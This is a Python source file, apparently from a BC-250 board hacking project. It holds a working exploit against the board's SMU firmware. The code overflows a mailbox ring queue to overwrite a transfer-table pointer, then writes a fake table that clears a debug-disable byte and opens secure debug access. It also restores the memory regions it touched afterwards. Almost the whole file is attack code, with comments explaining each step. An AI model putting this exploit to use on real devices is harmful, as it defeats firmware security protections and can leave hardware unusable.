#!/usr/bin/env python3
import ctypes
import os
import struct
import sys

from bc250_smu import Bc250Mailbox, Bc250Smu
from bc250_smu.errors import SmuError
from bc250_smu.primitives import alloc_page, free_page


# q2 msg 0x23
RING_BASE = 0x18850         # append ring array0 base
RING_ENTRY_SZ = 16          # {arg0 + base, arg2, arg1, 1} -> 16 bytes
RING_SUBQ_SLOTS = 30        # 30 slots per subqueue, 4 subqueues
RING_CTR_OFFS = 0x780       # counters at 0x18FD0 = 120 entries past base
RING_CMD_TYPE = lambda cmd, subq: (cmd << 24) | subq

# q2 msg 0xA
TR_TABLE_PTR = 0x19784
TR_TABLE_HDR_SZ = 0x18
TR_TABLE_ENTRY_HDR_SZ = 4

# arg2 of the fake ring entry will overwrite TR_TABLE_PTR
TR_TABLE_FAKE_RING_ENTRY = TR_TABLE_PTR - 4
assert (TR_TABLE_FAKE_RING_ENTRY - RING_BASE) % RING_ENTRY_SZ == 0

# any byte value works, they just need to differ from each other
FAKE_ENTRY_KEY = 0x13
NEW_ENTRY_KEY = 0x37

DBG_DISABLE = 0x7B3C
NEW_ENTRY_ADDR = DBG_DISABLE - TR_TABLE_ENTRY_HDR_SZ

PROBE_ADDR = 0x0005A870


# fortunately nothing else seems to use this as far as I can tell
_subq4_cur_idx = 0

def overwrite_tr_table_ptr(smu: Bc250Smu, b):
    """
    a bit involved :S
    
    we overflow ring subqueue 4 (the last), and end up overwriting
    subqueue counters (which come right after).

    base + arg0 (base having the lowest byte 0) overwrites the subqueue
    counters, arg0 ends up as the next subqueue 0 index.

    the next write to subqueue 0 will place its entry at the overwritten
    index at RING_BASE + 0x10 * idx.

    what to set arg0 to / where to point subqueue 0 ?
    we target 0x19784 (which we can reach with subqueue 0 idx 243);
    there's a pointer to the table struct used by q2 msg 0xA,
    which has a bunch of subopts dealing with memory transfer ops
    (so it has a lot of useful primitives).

    after the overflow write subqueue 4's counter sits at 2, so we
    must adjust accordingly for multiple invocations.
    """
    global _subq4_cur_idx
    ptr_slot = (TR_TABLE_FAKE_RING_ENTRY - RING_BASE) // RING_ENTRY_SZ  # 243

    n = RING_SUBQ_SLOTS - _subq4_cur_idx
    for i in range(n):
        smu.q2_0x23_append([0, 0, 0, RING_CMD_TYPE(1, 4)])
    smu.q2_0x23_append([ptr_slot, 0, 0, RING_CMD_TYPE(1, 4)])
    smu.q2_0x23_append([0, 0, b, RING_CMD_TYPE(1, 1)])
    _subq4_cur_idx = 2


def _do_unlock(smu: Bc250Smu, va, phys) -> bool:
    """
    also a bit involed >.<

    we overwrite the transfer table pointer twise, first to point it to an
    initially empty space in order to place our actual fake table,
    then to point it to our fake table which will reach out to our target addr

    returns True if already unlocked. Raises SmuError on failure.
    """
    if not smu.alive():
        raise SmuError("SMU not alive - cold power cycle")
    rejected_before = not smu.secure_access_enabled()
    print("gate before:", "0xFD (closed)" if rejected_before else "open?")

    dbg = int.from_bytes(smu.smu_read(DBG_DISABLE), 'little')
    entry = int.from_bytes(smu.smu_read(NEW_ENTRY_ADDR), 'little')
    print("dbg byte 0x%02X entry byte 0x%02X" % (dbg, entry))
    if dbg == 0:
        if rejected_before:
            raise SmuError('debug gate and access probe disagree')
        print("already unlocked")
        return True
    if entry != 0:
        raise SmuError("unexpected state - verify before trusting")

    # search for the first block of 72 zero-bytes below 0x7B20 (in practice ~7 chunks)
    buf = b""
    P = None
    for a in range(0x7B3C - 72, 0x3054 - 72, -72):
        buf = smu.smu_read(a, 18) + buf
        for c in range(0x7B1C, max(0x3070, a + 0x1C) - 1, -4):
            if all(b == 0 for b in buf[c - 0x1C - a:c + 0x20 - a]):
                P = c
                break
        if P is not None:
            break
    if P is None:
        raise SmuError("no dead-zone base below 0x7B20 - aborting")
    N = (0x7B20 - P) // 4
    assert P + 0x18 + 4 * N == NEW_ENTRY_ADDR and 0 < N <= 65535
    print("P = 0x%05X N = %d" % (P, N))

    # Save the actual touched regions before the overflow. P is selected
    # dynamically, so restoring a fixed 0x7950 region is not sufficient.
    saved = []
    for start, size in ((P - 0x1C, 0x3C), (0x18DF0, 0x1F0),
                        (0x19780, 16), (0x17E1C, 4), (NEW_ENTRY_ADDR, 4)):
        data = b''.join(smu.smu_read(a, min(18, (start + size - a) // 4))
                        for a in range(start, start + size, 72))
        saved.append((start, data))
    # stage the walk-table header (count 1, entry0 tag FAKE_ENTRY_KEY count N)
    hdr = [1, 0, 0, 0, 0, 0]
    entry0 = [FAKE_ENTRY_KEY | (N << 16), 0]
    fake_transfer_table = hdr + entry0
    ctypes.memmove(va, struct.pack("<8I", *fake_transfer_table), 32)

    ##
    ## first place a fake transfer table at P via empty transfer table at P-0x1C
    ##

    # switch to empty transfer table
    # point the transfer table to T0 = (P - 0x1C); since it's all zeros,
    # it'll look as if there are no in-use entries and the entry at E0=T0+0x18
    # with data at E0+4 (=P) will be allocated. the next transfer will place data over P
    overwrite_tr_table_ptr(smu, P - 0x1C)

    # transfer the fake table over P
    smu.transfer_engine_dram2smu(
        phys >> 32, phys & 0xFFFFFFFF, len(fake_transfer_table), 3)

    # read it back, just to be sure everything is okay so far
    expected = struct.pack('<8I', *fake_transfer_table)
    ctypes.memset(va, 0xA5, len(expected))
    smu.transfer_engine_smu2dram(
        phys >> 32, phys & 0xFFFFFFFF, len(fake_transfer_table))

    chk = ctypes.string_at(va, 4 * len(fake_transfer_table))
    if chk != expected:
        raise SmuError("fake table did not land")
    print("fake table ok")


    ##
    ## overwrite 0x7B3C via transfer table at P
    ##

    # unlock: re-arm at the header table; the key-0x27 entry data lands on 0x7B3C

    # switch to fake transfer table
    ctypes.memset(ctypes.c_void_p(va), 0, 4)
    overwrite_tr_table_ptr(smu, P)

    # do transfer
    # will skip our fake entry0 of size N at P+0x18 and end up at P + 0x18 + 4*N,
    # with data at P + 0x18 + 4*N + 4
    smu.transfer_engine_dram2smu(phys >> 32, phys & 0xFFFFFFFF, 1, NEW_ENTRY_KEY)

    # check if we can use debug functions now :D
    gst, _ = smu.sec_smn_read32(PROBE_ADDR)
    alive = smu.alive()
    if gst == Bc250Mailbox.SMU_RETURN_OK and alive:
        print("dbg unlocked; SMU still alive (this was a triumph..)")
    else:
        raise SmuError("unlock failed (probe=%s alive=%s) - cold power cycle" % (gst and hex(gst), alive))

    print("fixup SMU state")
    for start, data in saved:
        for offset in range(0, len(data), 4):
            smu.smu_write32(start + offset, int.from_bytes(data[offset:offset + 4], 'little'))

    print("saved unlock regions restored")
    if not smu.alive() or not smu.secure_access_enabled():
        raise SmuError('SMU did not pass the final unlock probe')
    return True

def unlock(smu: Bc250Smu) -> bool:
    if os.geteuid() != 0:
        raise PermissionError("needs root")
    va, phys = alloc_page()
    try:
        return _do_unlock(smu, va, phys)
    finally:
        free_page(va)


if __name__ == '__main__':
    sys.exit('Use collector.py so platform checks and the service lock run first')
